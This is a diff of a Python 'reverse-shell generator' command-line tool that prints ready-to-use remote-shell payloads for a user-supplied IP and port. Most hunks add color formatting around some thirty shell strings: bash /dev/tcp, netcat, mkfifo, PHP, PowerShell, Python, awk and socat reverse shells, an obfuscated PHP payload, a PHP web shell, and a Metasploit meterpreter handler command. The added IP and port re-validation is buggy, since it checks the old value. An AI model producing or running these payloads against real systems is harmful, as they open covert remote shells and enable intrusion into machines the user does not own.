@@ -9,15 +9,21 @@ import re
 import psutil
 
 
+
 def colored(r, g, b, text):
     return "\033[38;2;{};{};{}m{} \033[38;2;255;255;255m".format(r, g, b, text)
 
 
 heading = Figlet(font='big')
-print(colored(255,0,0,heading.renderText("Reverse-shell\ngenerator\n\n")))
+print(colored(255,0,0,heading.renderText("Reverse-shell\ngenerator\n")))
 
 
 
+
+print("*******************\n")
+print(colored(0,255,255,"@SUJAY_ADKESAR : https://sujayadkesar.github.io/portfolio"))
+print(colored(0,255,255,"https://github.com/sujayadkesar/reverse-shell-generator"))
+print("\n*******************\n")
 
 def get_ip_addresses(all):
     for interface, snics in psutil.net_if_addrs().items():
@@ -29,31 +35,31 @@ def ip():
     ipv4 = list(get_ip_addresses(socket.AF_INET))
     for i in ipv4:
         print(colored(255,255,0,"{:40s} {:10s} {:1s}".format(i[0],":",i[1])))
-ip()
-    
+os.system('ifconfig eth0')
+print("\n*******************")
     
     
     
 #  Getting the ip from the user
-def get_ip_and_port():
-    while True:
-        ip = str(input("\n\nEnter IP Address : "))
-        if re.match(r'^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$', ip):
-            break
-        else:
-            print("\033[91m\033[1mCheck the IP address !\x1b[0m")
-            continue
 
-    while True:
-        port = input("Enter Port Number : ")
-        if re.match(r'^([0-9]{1,4}|[1-5][0-9]{4}|6[0-4][0-9]{3}|65[0-4][0-9]{2}|655[0-2][0-9]|6553[0-5])$', port):
-            break
-        else:
-            print("\033[91m\033[1mCheck the port Number !\x1b[0m")
-            continue
+while True:
+    ip = str(input("\n\nEnter IP Address : "))
+    if re.match(r'^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$', ip):
+        break
+    else:
+        print("\033[91m\033[1mCheck the IP address !\x1b[0m")
+        continue
 
-get_ip_and_port()
+while True:
+    port = input("Enter Port Number : ")
+    if re.match(r'^([0-9]{1,4}|[1-5][0-9]{4}|6[0-4][0-9]{3}|65[0-4][0-9]{2}|655[0-2][0-9]|6553[0-5])$', port):
+        break
+    else:
+       print("\033[91m\033[1mCheck the port Number !\x1b[0m")
+       continue
 
+
+print("*******************")
 #difining a function to display the usage guidelines
 
 def guide():
@@ -95,7 +101,7 @@ def guide():
     print("show                                                     = to print the lhost and lport")
     print("rsg -h                                                   = list the reverse-shell and listners")
     print(colored(255,255,0,"\nexample:-\n"))
-    print(colored(255,255,0,"{:30s} {:30s}".format("rsg listner 4", "rsg reverse-shell 19\n\n")))
+    print(colored(255,255,0,"{:30s} {:30s} {:30s}".format("rsg listner 4", "rsg reverse-shell 19", "rsg -h\n\n")))
 
 
 guide()
@@ -113,29 +119,29 @@ while True:
 #response part for the listner request (12)    
 
     elif take == "rsg listner 1":
-        print("\n\nnc -lnvp "+port+"\n\n")
+        print(colored(255,255,0,"\n\nnc -lnvp "+port+"\n\n"))
     elif take == "rsg listner 2":
-        print("\n\n ncat -lnvp "+port+"\n\n")
+        print(colored(255,255,0,"\n\n ncat -lnvp "+port+"\n\n"))
     elif take == "rsg listner 3":
-        print("\n\nncat --ssl -lnvp "+port+"\n\n")
+        print(colored(255,255,0,"\n\nncat --ssl -lnvp "+port+"\n\n"))
     elif take == "rsg listner 4":
-        print("\n\nrlwrap -cAr nc -lvnp "+port+"\n\n")
+        print(colored(255,255,0,"\n\nrlwrap -cAr nc -lvnp "+port+"\n\n"))
     elif take == "rsg listner 5":
-        print("\n\nrcat -lp "+port+"\n\n")
+        print(colored(255,255,0,"\n\nrcat -lp "+port+"\n\n"))
     elif take == "rsg listner 6":
-        print("\n\npython3 -m pwncat -lp "+port+"\n\n")
+        print(colored(255,255,0,"\n\npython3 -m pwncat -lp "+port+"\n\n"))
     elif take == "rsg listner 7":
-        print("\n\nrcat -lHp "+port+"\n\n")
+        print(colored(255,255,0,"\n\nrcat -lHp "+port+"\n\n"))
     elif take == "rsg listner 8":
-        print("\n\nstty raw -echo; (stty size; cat) | nc -lnvp "+port+"\n\n")
+        print(colored(255,255,0,"\n\nstty raw -echo; (stty size; cat) | nc -lnvp "+port+"\n\n"))
     elif take == "rsg listner 9":
-        print("\n\nsocat -d -d TCP-LISTEN:"+port+" STDOUT\n\n")
+        print(colored(255,255,0,"\n\nsocat -d -d TCP-LISTEN:"+port+" STDOUT\n\n"))
     elif take == "rsg listner 10":
-        print("\n\nsocat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:"+port+"\n\n")
+        print(colored(255,255,0,"\n\nsocat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:"+port+"\n\n"))
     elif take == "rsg listner 11":
-        print("\n\npowercat -l -p "+port+"\n\n")
+        print(colored(255,255,0,"\n\npowercat -l -p "+port+"\n\n"))
     elif take == "rsg listner 12":
-        print('\n\nmsfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost '+ip+'; set lport '+port+'; exploit"\n\n')
+        print(colored(255,255,0,'\n\nmsfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost '+ip+'; set lport '+port+'; exploit"\n\n'))
         
         
         
@@ -143,19 +149,19 @@ while True:
 # response part for the reverse-shell request (30)
 
     elif take == "rsg reverse-shell 1":
-        print("\n\nsh -i >& /dev/tcp/"+ip+"/"+port+" 0>&1\n\n")
+        print(colored(255,255,0,"\n\nsh -i >& /dev/tcp/"+ip+"/"+port+" 0>&1\n\n"))
     elif take == "rsg reverse-shell 2":
-        print("\n\n0<&196;exec 196<>/dev/tcp/"+ip+"/"+port+"; sh <&196 >&196 2>&196\n\n")
+        print(colored(255,255,0,"\n\n0<&196;exec 196<>/dev/tcp/"+ip+"/"+port+"; sh <&196 >&196 2>&196\n\n"))
     elif take == "rsg reverse-shell 3":
-        print("\n\nsh -i 5<> /dev/tcp/"+ip+"/"+port+" 0<&5 1>&5 2>&5\n\n")
+        print(colored(255,255,0,"\n\nsh -i 5<> /dev/tcp/"+ip+"/"+port+" 0<&5 1>&5 2>&5\n\n"))
     elif take == "rsg reverse-shell 4":
-        print("\n\nsh -i >& /dev/udp/"+ip+"/"+port+" 0>&1\n\n")
+        print(colored(255,255,0,"\n\nsh -i >& /dev/udp/"+ip+"/"+port+" 0>&1\n\n"))
     elif take == "rsg reverse-shell 5":
-        print("\n\nexec 5<>/dev/tcp/"+ip+"/"+port+";cat <&5 | while read line; do $line 2>&5 >&5; done\n\n")
+        print(colored(255,255,0,"\n\nexec 5<>/dev/tcp/"+ip+"/"+port+";cat <&5 | while read line; do $line 2>&5 >&5; done\n\n"))
     elif take == "rsg reverse-shell 6":
         print('\n\n#include <winsock2.h>\n#include <stdio.h>\n#pragma comment(lib,"ws2_32")\n\nWSADATA wsaData;\nSOCKET Winsock;\nstruct sockaddr_in hax;\nchar ip_addr[16] = " \b'+ip+'";\nchar port[6] = " \b'+port+'";\n\nSTARTUPINFO ini_processo;\n\nPROCESS_INFORMATION processo_info;\n\n')
     elif take == "rsg reverse-shell 7":
-        print("""\n\nusing System;\n
+        print(colored(255,255,0,"""\n\nusing System;\n
               using System.Text;\n
               using System.IO;\n
               using System.Diagnostics;\n
@@ -218,16 +224,16 @@ while True:
             }\n
         }\n\n\n
 
-	}
-} \n\n""")
+	    }
+    } \n\n"""))
         
         
     elif take == "rsg reverse-shell 8":
-        print("\n\nrequire('child_process').exec('nc -e sh "+ip+" "+port+"')\n\n")
+        print(colored(255,255,0,"\n\nrequire('child_process').exec('nc -e sh "+ip+" "+port+"')\n\n"))
     elif take == "rsg reverse-shell 9":
-        print("""\n\nphp -r '$ð="1";$ð="2";$ð="3";$ð="4";$ð="5";$ð="6";$ð="7";$ð="8";$ð="9";$ð="0";$ð¤¢=" ";$ð¤="<";$ð¤ =">";$ð±="-";$ðµ="&";$ð¤©="i";$ð¤=".";$ð¤¨="/";$ð¥°="a";$ð="b";$ð¶="i";$ð="h";$ð="c";$ð¤£="d";$ð="e";$ð="f";$ð="k";$ð="n";$ð="o";$ð="p";$ð¤="s";$ð="x";$ð = $ð. $ð¤. $ð. $ð. $ð. $ð. $ð. $ð. $ð;$ð = " \b"""+ip+""" ";$ð» = """+port+""";$ð = "sh". $ð¤¢. $ð±. $ð¤©. $ð¤¢. $ð¤. $ðµ. $ð. $ð¤¢. $ð¤ . $ðµ. $ð. $ð¤¢. $ð. $ð¤ . $ðµ. $ð;$ð¤£ =  $ð($ð,$ð»);$ð½ = $ð. $ð. $ð. $ð;$ð½($ð);' \n\n""")    
+        print(colored(255,255,0,"""\n\nphp -r '$ð="1";$ð="2";$ð="3";$ð="4";$ð="5";$ð="6";$ð="7";$ð="8";$ð="9";$ð="0";$ð¤¢=" ";$ð¤="<";$ð¤ =">";$ð±="-";$ðµ="&";$ð¤©="i";$ð¤=".";$ð¤¨="/";$ð¥°="a";$ð="b";$ð¶="i";$ð="h";$ð="c";$ð¤£="d";$ð="e";$ð="f";$ð="k";$ð="n";$ð="o";$ð="p";$ð¤="s";$ð="x";$ð = $ð. $ð¤. $ð. $ð. $ð. $ð. $ð. $ð. $ð;$ð = " \b"""+ip+""" ";$ð» = """+port+""";$ð = "sh". $ð¤¢. $ð±. $ð¤©. $ð¤¢. $ð¤. $ðµ. $ð. $ð¤¢. $ð¤ . $ðµ. $ð. $ð¤¢. $ð. $ð¤ . $ðµ. $ð;$ð¤£ =  $ð($ð,$ð»);$ð½ = $ð. $ð. $ð. $ð;$ð½($ð);' \n\n"""))    
     elif take == "rsg reverse-shell 10":
-        print("""\n\n<html>
+        print(colored(255,255,0,"""\n\n<html>
 <body>
 <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
 <input type="TEXT" name="cmd" id="cmd" size="80">
@@ -243,33 +249,33 @@ while True:
 </pre>
 </body>
 <script>document.getElementById("cmd").focus();</script>
-</html> \n\n""")  
+</html> \n\n"""))  
     elif take == "rsg reverse-shell 11":
-        print("""\n\nnc -e sh """+ip+""" """+port+"""\n\n""")
+        print(colored(255,255,0,"""\n\nnc -e sh """+ip+""" """+port+"""\n\n"""))
     elif take == "rsg reverse-shell 12":
-        print("\n\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc "+ip+" "+port+" >/tmp/f\n\n")
+        print(colored(255,255,0,"\n\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc "+ip+" "+port+" >/tmp/f\n\n"))
     elif take == "rsg reverse-shell 13":
-        print("\n\nnc.exe -e sh "+ip+" "+port+"\n\n")
+        print(colored(255,255,0,"\n\nnc.exe -e sh "+ip+" "+port+"\n\n"))
     elif take == "rsg reverse-shell 14":
-        print("\n\nnc -c sh "+ip+" "+port+"\n\n")
+        print(colored(255,255,0,"\n\nnc -c sh "+ip+" "+port+"\n\n"))
     elif take == "rsg reverse-shell 15":
-        print("\n\nnc -c sh "+ip+" "+port+"\n\n")
+        print(colored(255,255,0,"\n\nnc -c sh "+ip+" "+port+"\n\n"))
     elif take == "rsg reverse-shell 16":
-        print("""\n\nphp -r '$sock=fsockopen(" \b"""+ip+""" \b","""+port+""");exec("sh <&3 >&3 2>&3");'\n\n""")
+        print(colored(255,255,0,"""\n\nphp -r '$sock=fsockopen(" \b"""+ip+""" \b","""+port+""");exec("sh <&3 >&3 2>&3");'\n\n"""))
     elif take == "rsg reverse-shell 17":
-        print("""\n\nphp -r '$sock=fsockopen(" \b"""+ip+""" \b","""+port+""");shell_exec("sh <&3 >&3 2>&3");'\n\n""")
+        print(colored(255,255,0,"""\n\nphp -r '$sock=fsockopen(" \b"""+ip+""" \b","""+port+""");shell_exec("sh <&3 >&3 2>&3");'\n\n"""))
     elif take == "rsg reverse-shell 18":
-        print("""\n\nphp -r '$sock=fsockopen(" \b"""+ip+"""\b","""+port+""");system("sh <&3 >&3 2>&3");'\n\n""")
+        print(colored(255,255,0,"""\n\nphp -r '$sock=fsockopen(" \b"""+ip+"""\b","""+port+""");system("sh <&3 >&3 2>&3");'\n\n"""))
     elif take == "rsg reverse-shell 19":
-        print("""\n\nphp -r '$sock=fsockopen(" \b"""+ip+""" \b","""+port+""");popen("sh <&3 >&3 2>&3", "r");'\n\n""")
+        print(colored(255,255,0,"""\n\nphp -r '$sock=fsockopen(" \b"""+ip+""" \b","""+port+""");popen("sh <&3 >&3 2>&3", "r");'\n\n"""))
     elif take == "rsg reverse-shell 20":
-        print("""\n\nphp -r '$sock=fsockopen(" \b"""+ip+""" \b","""+port+""");$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'\n\n""")
+        print(colored(255,255,0,"""\n\nphp -r '$sock=fsockopen(" \b"""+ip+""" \b","""+port+""");$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'\n\n"""))
     elif take == "rsg reverse-shell 21":
-        print("\n\nncat "+ip+" "+port+" -e sh\n\n")
+        print(colored(255,255,0,"\n\nncat "+ip+" "+port+" -e sh\n\n"))
     elif take == "rsg reverse-shell 22":
-        print("\n\nncat.exe "+ip+" "+port+" -e sh\n\n")
+        print(colored(255,255,0,"\n\nncat.exe "+ip+" "+port+" -e sh\n\n"))
     elif take == "rsg reverse-shell 23":
-        print("""\n\nawk 'BEGIN {s = "/inet/tcp/0/"""+ip+"""/"""+port+""" \b";\n
+        print(colored(255,255,0,"""\n\nawk 'BEGIN {s = "/inet/tcp/0/"""+ip+"""/"""+port+""" \b";\n
  while(42)\n
   {\n
      do\n
@@ -280,19 +286,19 @@ while True:
        }\n
     }\n
     while(c != "exit") close(s);\n
-     }}' /dev/null\n\n""")
+     }}' /dev/null\n\n"""))
     elif take == "rsg reverse-shell 24":
-        print("\n\nrcat "+ip+" "+port+" -r sh\n\n")
+        print(colored(255,255,0,"\n\nrcat "+ip+" "+port+" -r sh\n\n"))
     elif take == "rsg reverse-shell 25":
-        print("\n\nsocat TCP:"+ip+":"+port+" EXEC:'sh',pty,stderr,setsid,sigint,sane\n\n")
+        print(colored(255,255,0,"\n\nsocat TCP:"+ip+":"+port+" EXEC:'sh',pty,stderr,setsid,sigint,sane\n\n"))
     elif take == "rsg reverse-shell 26":
-        print("""\n\nmodule Main where
+        print(colored(255,255,0,"""\n\nmodule Main where
 
 import System.Process
 
-main = callCommand "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | sh -i 2>&1 | nc """+ip+"""\t"""+port+""" >/tmp/f"\n\n""")
+main = callCommand "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | sh -i 2>&1 | nc """+ip+"""\t"""+port+""" >/tmp/f"\n\n"""))
     elif take == "rsg reverse-shell 27":
-        print("""\n\npowershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object\n
+        print(colored(255,255,0,"""\n\npowershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object\n
 System.Net.Sockets.TCPClient(" \b"""+ip+""" \b","""+port+""");\n
 $stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};\n
 while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;\n
@@ -302,13 +308,13 @@ $sendback2  = $sendback + "PS " + (pwd).Path + "> ";\n
 $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);\n
 $stream.Write($sendbyte,0,$sendbyte.Length);\n
 $stream.Flush()};\n
-$client.Close()\n\n""")
+$client.Close()\n\n"""))
     elif take == "rsg reverse-shell 28":
-        print("""\n\npython3 -c 'import os,pty,socket;s=socket.socket();s.connect((" \b"""+ip+""" \b","""+port+"""));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'\n\n""")
+        print(colored(255,255,0,"""\n\npython3 -c 'import os,pty,socket;s=socket.socket();s.connect((" \b"""+ip+""" \b","""+port+"""));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'\n\n"""))
     elif take == "rsg reverse-shell 29":
-        print("\n\nTF=$(mktemp -u);mkfifo $TF && telnet "+ip+" "+port+" 0<$TF | sh 1>$TF\n\n")
+        print(colored(255,255,0,"\n\nTF=$(mktemp -u);mkfifo $TF && telnet "+ip+" "+port+" 0<$TF | sh 1>$TF\n\n"))
     elif take == "rsg reverse-shell 30":
-        print("""\n\nimport os,socket,subprocess,threading;\n
+        print(colored(255,255,0,"""\n\nimport os,socket,subprocess,threading;\n
 def s2p(s, p):\n
     while True:\n
         data = s.recv(1024)\n
@@ -336,20 +342,35 @@ p2s_thread.start()\n\n
 try:\n
     p.wait()\n
 except KeyboardInterrupt:\n
-    s.close()\n\n""")
+    s.close()\n\n"""))
         
     elif take == "show":
         print("IP-Address            :"+ip)
         print("Listning port number  :"+port)
     
+    
+
+    
     elif take == "set lhost":
-        newip = input("Enter the ip address\n")
+        while True:
+            newip = str(input("\n\nEnter IP Address : "))
+            if re.match(r'^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$', ip):
+                break
+            else:
+                print("\033[91m\033[1mCheck the IP address !\x1b[0m")
+                continue
         ip = ip.replace(ip , newip)
         print("lhost        :"+ip)
         print("lport        :"+port)
         
     elif take == "set lport":
-        newport = input("Enter the listing port number")
+        while True:
+            newport = input("Enter Port Number : ")
+            if re.match(r'^([0-9]{1,4}|[1-5][0-9]{4}|6[0-4][0-9]{3}|65[0-4][0-9]{2}|655[0-2][0-9]|6553[0-5])$', port):
+                break
+            else:
+                print("\033[91m\033[1mCheck the port Number !\x1b[0m")
+                continue
         port = port.replace(port , newport)
         print("lport        :"+port)
         print("lhost        :"+ip)
@@ -362,16 +383,27 @@ except KeyboardInterrupt:\n
             os.system('clear')
             
             
-    elif take == "ls":
+    elif take == "rsg -h":
         guide()
         
         
     elif take == "ifconfig":
-        get_ip_and_port()
+        os.system('ifconfig')
         
-        
-    elif take == "ipconfig":
-        get_ip_and_port()
+    elif take == 'pwd':
+        os.system('pwd')
+    elif take == 'ls':
+        if platform.system() == "Windows":
+            print(os.system('cmd /k "dir"'))
+        else:
+            os.system('ls')
+            
+    elif take == 'cd ..':
+        os.system('cd ..')
+
         
     elif take == "exit":
         break
+    else:
+        print(colored(255,0,0,"Incorrect command not found!"))
+        print(colored(0,255,255,"enter rsg -h to see the documentation"))
